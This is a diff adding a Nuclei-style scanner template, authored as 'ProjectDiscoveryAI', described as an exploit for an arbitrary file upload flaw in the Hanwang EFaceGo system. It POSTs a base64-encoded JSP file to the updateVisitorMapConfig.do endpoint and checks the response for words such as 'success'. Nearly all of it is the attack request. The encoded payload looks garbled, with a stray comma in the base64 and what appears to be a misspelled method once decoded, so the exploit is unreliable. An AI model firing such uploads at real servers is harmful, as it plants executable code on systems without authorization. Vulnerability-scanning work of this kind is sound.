@@ -1,0 +1,34 @@
+id: hanwang-efacego-arbitrary-file-upload
+
+info:
+  name: Hanwang EFaceGo Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Exploit for arbitrary file upload vulnerability in the Hanwang EFaceGo system via the `updateVisitorMapConfig.do` endpoint.
+  tags: file-upload,arbitrary,hacking
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/manage/visitorMapConfig/updateVisitorMapConfig.do?recoToken=SGUsqvF7cVS"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "id":1,
+        "mapName":"25bdaf",
+        "fileType":"jsp",
+        "updatedPhoto":"PCUgb3V0LnByaW50bG4oInBib31qb,5yZmlwbXBsc3VrZGVjenVkc2VmeG15d2UiKTsgbmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFN1cnZsZXBQYXRoKCkpKS5kZWxldGUoKTsgJT4"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "success"
+          - "file uploaded"
